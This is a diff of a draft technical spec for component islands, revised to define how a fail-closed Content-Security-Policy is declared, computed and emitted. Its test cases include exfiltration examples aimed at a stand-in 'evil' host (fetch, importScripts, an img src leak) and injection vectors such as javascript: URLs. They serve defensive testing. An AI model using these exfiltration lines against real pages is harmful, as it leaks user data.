@@ -2,7 +2,7 @@
 id: SPEC-050
 title: "Component Islands & Inter-Island Messaging"
 status: draft
-version: 0.12.0-strawman
+version: 0.13.0-strawman
 last-updated: 2026-06-25
 audience: agent, human
 ---
@@ -90,7 +90,7 @@ Q6 iframe cost — now largely moot under the default Worker model, Q8 controlle
 | ------------ | -------------------------------------------------------------------------------------- |
 | Document ID  | [[SPEC-050-component-islands-and-messaging\|SPEC-050]]                                  |
 | Title        | Component Islands & Inter-Island Messaging                                              |
-| Version      | 0.12.0-strawman                                                                         |
+| Version      | 0.13.0-strawman                                                                         |
 | Status       | Draft (strawman; NOT converged — pending Phase 1 + Phase 2 gates)                       |
 | Author       | Agent (Claude Opus 4.8 [1M], [[PROTO-001\|USDD Agent Protocol]] v1.11.0)                |
 | Date         | 2026-06-24                                                                              |
@@ -453,9 +453,14 @@ reserved-and-rejected in [[SPEC-048]] CON-4801, are accepted under this spec's f
 Per build, the system SHALL emit an **island wiring graph**: for each island component,
 its declared `publishes`/`subscribes` topics and the resolved publisher→subscriber edges,
 plus any `island-topic-unpublished`/`island-topic-undeclared` findings, so runtime
-coordination is auditable at build time. This extends [[SPEC-048]] OBS-4801.
+coordination is auditable at build time. For each page it SHALL also record the **effective
+egress CSP** ([[SPEC-050-component-islands-and-messaging#REQ-5027]]) — the computed policy and,
+per directive, which `[security.csp]`/theme declaration widened it beyond the default-deny
+baseline — and each content island's render mode + `paints` grant, so a reviewer can diff
+exactly what network egress and rendering authority each page permits. This extends
+[[SPEC-048]] OBS-4801.
 
-**Trace:** [[SPEC-050-component-islands-and-messaging#TEST-5008]], [[SPEC-050-component-islands-and-messaging#OBS-5001]].
+**Trace:** [[SPEC-050-component-islands-and-messaging#TEST-5008]], [[SPEC-050-component-islands-and-messaging#TEST-5027]], [[SPEC-050-component-islands-and-messaging#OBS-5001]].
 
 ### REQ-5010: Two Island Trust Tiers — Trusted In-Realm, Content Sandboxed
 There SHALL be two island trust tiers, distinguished by author trust:
@@ -617,14 +622,14 @@ served over HTTP, and a `blob:`/same-origin worker **inherits the creating docum
 there is **no "inline CSP" in worker source**, and static/`file://` output has no per-worker
 response header. So a same-document Worker **cannot be given a network policy stricter than the
 host document's**. Confinement therefore works as follows:
-- **Egress is the host-document CSP, page-wide, theme/operator-owned.** The site SHALL be able to
-  ship a host-document CSP (via `<meta http-equiv="Content-Security-Policy">`, which applies on
-  static/`file://` output without a server, and/or response headers when served) with restrictive
-  `connect-src`, `worker-src` (`self`/`blob:`), and the **renderer fetch directives** `img-src`/
-  `media-src`/`font-src`/`style-src`/`default-src` (see the next bullet + CON-5007). The worker
-  inherits this. **There is no per-island egress widening** (it is impossible without widening the
-  whole page); any widening is a **trusted theme/operator** page-CSP decision, surfaced in the
-  audit graph (REQ-5009) — never a content-author manifest field.
+- **Egress is the host-document CSP, page-wide, theme/operator-owned.** The CSP is **declared,
+  computed (fail-closed), and emitted per [[SPEC-050-component-islands-and-messaging#REQ-5027]]**
+  — declared in site config `[security.csp]` (+ theme manifest), emitted as a `<meta http-equiv>`
+  (authoritative on static/`file://`) and a served-headers artifact, with a default-deny baseline
+  (`connect-src 'none'`, `worker-src 'self' blob:`, `img-src`/`media-src`/`font-src`/`style-src`
+  `'self'`). The worker inherits it. **There is no per-island egress widening** (impossible
+  without widening the whole page); any widening is a **trusted** `[security.csp]`/theme decision,
+  surfaced in the audit graph (REQ-5009) — never a content-author manifest field.
 - **The renderer is itself an egress surface (Threat N).** Even with the worker confined, a
   `render` tree can encode a granted value into an allowlisted remote URL
   (`<img src="https://evil/?d=…">`) that the **host document** fetches. Two controls, both
@@ -645,7 +650,51 @@ host document's**. Confinement therefore works as follows:
   this rather than implying an absolute guarantee. Local same-origin **storage** (IndexedDB/Cache)
   is *not* gated by CSP at all ([[SPEC-050-component-islands-and-messaging#REQ-5010]] residual).
 
-**Trace:** [[SPEC-050-component-islands-and-messaging#TEST-5026]], [[SPEC-050-component-islands-and-messaging#REQ-5025]], [[SPEC-050-component-islands-and-messaging#NFR-5002]]; [[SPEC-050-component-islands-and-messaging#Threat N]], [[SPEC-050-component-islands-and-messaging#Threat K]], [[SPEC-050-component-islands-and-messaging#Threat D]].
+**Trace:** [[SPEC-050-component-islands-and-messaging#TEST-5026]], [[SPEC-050-component-islands-and-messaging#REQ-5025]], [[SPEC-050-component-islands-and-messaging#REQ-5027]], [[SPEC-050-component-islands-and-messaging#NFR-5002]]; [[SPEC-050-component-islands-and-messaging#Threat N]], [[SPEC-050-component-islands-and-messaging#Threat K]], [[SPEC-050-component-islands-and-messaging#Threat D]].
+
+### REQ-5027: CSP Declaration, Computation & Emission (Where the Egress Policy Lives)
+REQ-5026's confinement is a host-document CSP — but "the operator ships a CSP" is not
+actionable until the **declaration site, computation, and emission** are defined. This REQ does
+that, and makes the policy **fail-closed by default** so a forgetful operator cannot leave a
+content island unconfined.
+
+- **Declaration site (trusted).** Operator widenings are declared in **site config under a
+  `[security.csp]` table**; theme-level needs (a trusted island that must reach a specific host)
+  are declared in the **theme manifest** ([[SPEC-048]] CON-4801) and merged. Content-island
+  manifests **cannot** declare CSP (REQ-5026 B2). Shape:
+  ```
+  [security.csp]                                  # site config — operator-owned
+  connect-src = ["https://api.example.com"]       # widen document/worker network egress
+  img-src     = ["https://cdn.example.com"]       # widen renderer image sources
+  # worker-src / media-src / font-src / style-src likewise; values are host sources, never "*"
+  ```
+- **Computation (fail-closed union).** The build SHALL compute each page's effective CSP as a
+  **default-deny baseline ∪ declared widenings**. For any page carrying a **content island**, the
+  baseline SHALL be at least: `default-src 'none'`; `script-src 'self'` + the island/pre-paint
+  **`'sha256-…'`** hashes (REQ-5018/5019); `worker-src 'self' blob:`; **`connect-src 'none'`**;
+  `img-src 'self'`; `media-src 'self'`; `font-src 'self'`; `style-src 'self'`; `base-uri 'none'`;
+  `form-action 'none'`. A `*` source SHALL be **rejected** at build (`csp-wildcard`); each
+  widening SHALL be a finite host list. The absence of `[security.csp]` yields the baseline
+  (**not** "no CSP") — this is the fail-closed default.
+- **Emission.** The build SHALL emit the computed policy as a **`<meta http-equiv="Content-Security-Policy">`
+  as the first `<head>` child** (before any island bootstrap, so it governs them; authoritative
+  on static/`file://`), AND SHALL emit a **served-deploy headers artifact** (a `csp-headers`
+  manifest the operator wires into their server/CDN) carrying the same policy plus the
+  directives `<meta>` cannot set (`frame-ancestors`, `report-uri`). The two SHALL be byte-derived
+  from the same computed policy (no drift).
+- **Mandatory for content-island pages.** A page that emits a content island SHALL emit the CSP;
+  the build SHALL NOT produce a content-island page with no policy. (Pages without islands MAY
+  emit it; recommended.)
+- **Audit.** The effective per-page CSP, and which `[security.csp]`/theme declaration widened
+  each directive beyond baseline, SHALL appear in the wiring graph
+  ([[SPEC-050-component-islands-and-messaging#REQ-5009]]/OBS-5001) so an operator can see — and a
+  reviewer can diff — exactly what egress each page permits.
+
+**Honest residual (unchanged):** `<meta>` CSP enforcement on `file://` is browser-dependent
+(best-effort there); the served-headers artifact is authoritative when deployed behind a server.
+Storage egress (IndexedDB/Cache) remains outside CSP (Q10).
+
+**Trace:** [[SPEC-050-component-islands-and-messaging#TEST-5027]], [[SPEC-050-component-islands-and-messaging#REQ-5026]], [[SPEC-050-component-islands-and-messaging#REQ-5009]], [[SPEC-048]]; [[SPEC-050-component-islands-and-messaging#Threat N]].
 
 ### REQ-5015: Content-Island iframe Sandbox (Opt-In Full-DOM Mode)
 A content-author island that opts into **full-DOM mode** ([[SPEC-050-component-islands-and-messaging#REQ-5010]],
@@ -1594,7 +1643,10 @@ island imports.
 **Validates:** [[SPEC-050-component-islands-and-messaging#REQ-5025]], [[SPEC-050-component-islands-and-messaging#CON-5007]], [[SPEC-050-component-islands-and-messaging#ADR-5010]], [[SPEC-050-component-islands-and-messaging#Threat M]]. Runs against the **normative CON-5007 allowlist** (not an IMPL-deferred one). Positive: a `paints`-granted island renders an allowlisted tree painted via `setAttribute`/`textContent`, inline with page CSS, with `aria-*`/`role` preserved (REQ-5020). Negative-input — **full vector matrix**, each dropped (`denied:render` + node locator), nothing painted: non-allowlisted tag (`script`/`iframe`/`object`/`form`/`template`/`svg`/`math`); forbidden attr (`on*`/`style`/`is`/`srcdoc`/`name`/`xlink:*`); URL-scheme attacks (`href="javascript:…"`, `src="data:…"`, `formaction="blob:…"`, `srcset`); `__proto__`/poisoned-prototype node; a **tree bomb** (over-deep / over-wide / over-node-count → bounded, no main-thread hang) and a **cyclic structured-clone** tree (rejected, no infinite loop); a `render` from an island **without** the `paints` grant (M2 — denied, headless cannot paint); a **missing/empty host allowlist** (whole message dropped, fail-closed — never a permissive default). Worker has no `document`/`window`/`localStorage` (assert undefined). Negative-output: **no path produces HTML/script/handler/dangerous-URL from untrusted code** (Threat M holds *because* CON-5007 holds); identity needs no `event.source`/bootstrap.
 
 ### TEST-5026: Content-Worker Confinement (Egress, Integrity, Render Rate)
-**Validates:** [[SPEC-050-component-islands-and-messaging#REQ-5026]], [[SPEC-050-component-islands-and-messaging#Threat N]], [[SPEC-050-component-islands-and-messaging#Threat K]]. Positive: a worker with `connect-src = []` cannot `fetch`/open a `WebSocket`/`importScripts('//remote')` (all blocked by the blob-worker CSP); a theme-declared `connect-src` host allowlist permits only those hosts and shows in the audit graph. Negative-input — **the key exfil case**: an island granted `subscribe theme` whose worker tries `fetch('//evil?'+value)` on each `update` → **network blocked** (assert no request leaves); a worker `importScripts('//evil/x.js')` → blocked; a tampered worker script (hash mismatch) → island does not start (integrity pin). Render-rate: a worker `for(;;) postMessage({op:'render',…})` is **coalesced/capped** (≤ one paint/frame; budget breach → `denied:cap-exceeded`), main thread not saturated. Negative-output: a granted read cannot leave the page while `connect-src 'none'` holds (Threat K/N).
+**Validates:** [[SPEC-050-component-islands-and-messaging#REQ-5026]], [[SPEC-050-component-islands-and-messaging#Threat N]], [[SPEC-050-component-islands-and-messaging#Threat K]]. Run under the **host-document CSP** the build emitted (REQ-5027), which the Worker inherits — *not* a per-worker policy. Positive: with the baseline (`connect-src 'none'`) the worker cannot `fetch`/open a `WebSocket`/`importScripts('//remote')`; a `[security.csp]`-declared `connect-src` host permits only that host and shows in the audit graph. Negative-input — **the key exfil case across all three channels (Threat N)**: an island granted `subscribe theme` whose worker (a) `fetch('//evil?'+value)` → blocked by `connect-src`; (b) `importScripts('//evil')` → blocked by `script-src`; (c) emits `render` with `<img src="https://evil/?d="+value>` → blocked by **both** `img-src` **and** the CON-5007 same-origin egress-taint rule for read-granted islands (assert no request leaves on any channel). Integrity: a tampered worker script (hash mismatch) → island does not start. Render-rate: `for(;;) postMessage({op:'render',…})` is coalesced/capped (≤ one paint/frame; breach → `denied:cap-exceeded`). Negative-output: a granted read cannot leave the page on any channel while the baseline holds.
+
+### TEST-5027: CSP Declaration, Computation & Emission
+**Validates:** [[SPEC-050-component-islands-and-messaging#REQ-5027]]. Positive: a page with a content island emits a `<meta http-equiv="Content-Security-Policy">` as the **first `<head>` child** whose policy equals the build-computed baseline ∪ `[security.csp]` widenings, and a byte-equal `csp-headers` artifact; the effective policy + each widening's source appear in the audit graph. Negative-input: **no `[security.csp]` declared** → the page still emits the **default-deny baseline** (`connect-src 'none'`, etc.), NOT an absent CSP (fail-closed); a `[security.csp]` value of `"*"` → build error `csp-wildcard`; a **content-island page with CSP emission somehow suppressed** → build error (mandatory). Negative-output: a content-author manifest cannot set any CSP directive (B2); the `<meta>` and headers artifact never drift (same computed source).
 
 ### TEST-5023: Session-Persistent Bus Across SPA Nav
 **Validates:** [[SPEC-050-component-islands-and-messaging#REQ-5023]], [[SPEC-050-component-islands-and-messaging#REQ-5007]]. Positive: navigating from an island page to a no-island page keeps the **same** `window.zetl` instance (not torn down, not duplicated); a persisted topic still live-reflects in that session. Negative-input: a session that loads **only** no-island pages never creates `window.zetl` (only per-page pre-paint applies). Negative-output: across N navigations there is never a second bus instance, and the **emitted HTML** of each page still matches its build-time marker gate (REQ-5012) regardless of runtime bus presence.
@@ -1626,7 +1678,7 @@ instances), and a stable hash of each, to detect nondeterminism regressions.
 ### OBS-5003: Bound Rejections
 Emit counts of the **build** errors `island-topic-malformed`, `island-topic-unpublished`,
 `island-topic-undeclared`, `island-persisted-no-default`, `island-topic-type-conflict`,
-`island-topic-type-invalid`, `island-content-unsandboxed`, `island-content-value-type`, `island-render-invalid`, `island-hydrate-invalid`,
+`island-topic-type-invalid`, `island-content-unsandboxed`, `island-content-value-type`, `island-render-invalid`, `island-hydrate-invalid`, `csp-wildcard`,
 `island-capability-ungranted`, and the `island-focus-trap` warning; plus **runtime** counters (dev console / optional debug
 channel) for `island-payload-type`, `island-capability-denied` (by `denied` reason), and
 `island-port-closed`, so fail-closed events are auditable. The audit wiring graph (OBS-5001)
@@ -1810,12 +1862,38 @@ recursive `tree` recogniser (depth/breadth/cycle), (c) Worker + renderer egress 
 subscribe across served **and** `file://` deploys. AI review has materially improved this spec —
 visibly, across six passes — but should **not** certify it.
 
+**v0.13.0** closed the one remaining *specification-level* gap the egress model had — *where the
+policy is defined*. REQ-5027 turns "the operator ships a CSP" into a concrete, **fail-closed**
+pipeline (declared in `[security.csp]`, computed default-deny ∪ widenings, emitted as `<meta>` +
+headers, audited per page, mandatory for content-island pages). That was a config-design gap
+prose *can* close, and it is closed. What remains is purely the **enforcement-verification** gap:
+whether the emitted CSP + taint rule + recogniser actually hold against a real browser across
+served and `file://` — which only the PoC + human expert can settle. So the spec is now
+*complete enough to build a PoC against*, which is the right next step rather than a seventh prose
+pass.
+
 ---
 
 ## Changelog
 
 <details>
-<summary>Revision history — 0.1.0 → 0.12.0</summary>
+<summary>Revision history — 0.1.0 → 0.13.0</summary>
+
+- **0.13.0** (2026-06-25) — *closes the "where is the egress policy defined?" gap.* v0.12.0 said
+  "the operator ships a host-document CSP" but never defined the declaration site, computation, or
+  emission — so the guarantee was non-actionable and the default was fail-**open**. New
+  **REQ-5027 + TEST-5027**: the CSP is declared in site config **`[security.csp]`** (+ theme
+  manifest; never a content-author field); the build **computes** each page's policy as a
+  **default-deny baseline ∪ declared widenings** (baseline for a content-island page includes
+  `connect-src 'none'`, `worker-src 'self' blob:`, `img-src 'self'`, the island/pre-paint `sha256`
+  hashes); **fail-closed** — absent `[security.csp]` yields the baseline, not "no CSP", and a
+  content-island page with no policy is a build error; `*` sources are rejected (`csp-wildcard`).
+  Emitted as a **`<meta http-equiv>`** (first `<head>` child; authoritative on static/`file://`)
+  **plus a byte-equal served-headers artifact**, and recorded **per-page in the audit graph**
+  (REQ-5009) so egress is diffable. Also fixed the **stale TEST-5026** (still used v0.11.0's
+  removed blob-worker/`connect-src=[]` framing) → now tests the host-document CSP across all three
+  Threat-N channels (direct fetch / importScripts / renderer `<img src>`). REQ-5026 egress bullet
+  now points at REQ-5027 for the declaration site.
 
 - **0.12.0** (2026-06-25) — *sixth pass: corrects v0.11.0's egress fix (3 Blocking / 3 Major),
   checked against MDN Worker-CSP semantics.* **B1:** the "blob worker with inline CSP" mechanism
